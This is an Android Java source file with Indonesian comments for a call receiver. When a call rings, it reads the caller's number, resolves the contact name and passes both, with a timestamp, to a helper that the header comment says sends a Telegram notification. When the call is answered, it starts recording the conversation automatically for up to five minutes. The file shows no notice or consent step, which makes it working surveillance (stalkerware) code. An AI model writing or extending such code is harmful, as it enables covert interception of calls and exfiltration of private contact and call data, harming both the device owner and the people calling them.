package com.example.app;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.content.ContextCompat;

/**
 * Mendeteksi panggilan telepon masuk dan mengirim notifikasi
 * ke Telegram lengkap dengan nama kontak (jika tersimpan di HP).
 *
 * Hanya trigger saat status RINGING (telepon berdering) —
 * tidak trigger saat diangkat (OFFHOOK) atau selesai (IDLE).
 *
 * Wajib di AndroidManifest.xml:
 *   <receiver android:name=".CallReceiver" android:exported="true">
 *       <intent-filter>
 *           <action android:name="android.intent.action.PHONE_STATE"/>
 *       </intent-filter>
 *   </receiver>
 */
public class CallReceiver extends BroadcastReceiver {

    private static final String TAG = "CallReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {

        if (!TelephonyManager.ACTION_PHONE_STATE_CHANGED.equals(
                intent.getAction())) {
            return;
        }

        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);

        if (state == null) return;

        // --------------------------------------------------
        // RINGING — kirim notifikasi panggilan masuk
        // --------------------------------------------------
        if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {

            String number = intent.getStringExtra(
                    TelephonyManager.EXTRA_INCOMING_NUMBER
            );

            if (number == null) number = "Unknown";

            long   timestamp   = System.currentTimeMillis();
            String contactName = resolveContactName(context, number);

            Log.d(TAG, "Panggilan masuk dari: " + number);

            final Context appContext   = context.getApplicationContext();
            final String  finalNumber  = number;
            final String  finalContact = contactName;
            final long    finalTs      = timestamp;

            new Thread(() ->
                    ApiHelper.sendCallEvent(
                            appContext,
                            finalNumber,
                            finalContact,
                            finalTs
                    )
            ).start();
        }

        // --------------------------------------------------
        // OFFHOOK — panggilan diangkat, mulai rekam otomatis
        // --------------------------------------------------
        if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {

            Log.d(TAG, "Panggilan aktif — mulai rekam otomatis");

            // Rekam maksimum 5 menit (300 detik)
            // AudioService akan berhenti lebih awal kalau IDLE diterima
            AudioService.start(
                    context.getApplicationContext(),
                    "call_" + System.currentTimeMillis(),
                    300,
                    AudioService.MODE_CALL
            );
        }

        // --------------------------------------------------
        // IDLE — panggilan berakhir, hentikan rekaman
        // --------------------------------------------------
        if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {

            Log.d(TAG, "Panggilan berakhir — hentikan rekaman");
            AudioService.stop(context.getApplicationContext());
        }
    }

    // =========================================================
    // LOOKUP NAMA KONTAK
    // =========================================================

    private String resolveContactName(Context context, String number) {

        if (number == null || number.isEmpty() || "Unknown".equals(number)) {
            return "Tidak dikenal";
        }

        boolean hasPermission = ContextCompat.checkSelfPermission(
                context, Manifest.permission.READ_CONTACTS
        ) == PackageManager.PERMISSION_GRANTED;

        if (!hasPermission) return "Tidak dikenal";

        try {
            Uri uri = Uri.withAppendedPath(
                    ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                    Uri.encode(number)
            );

            ContentResolver cr = context.getContentResolver();

            try (Cursor cursor = cr.query(
                    uri,
                    new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME},
                    null, null, null
            )) {
                if (cursor != null && cursor.moveToFirst()) {
                    String name = cursor.getString(0);
                    if (name != null && !name.trim().isEmpty()) {
                        return name;
                    }
                }
            }

        } catch (Exception e) {
            Log.e(TAG, "Error lookup kontak", e);
        }

        return "Tidak dikenal";
    }
}
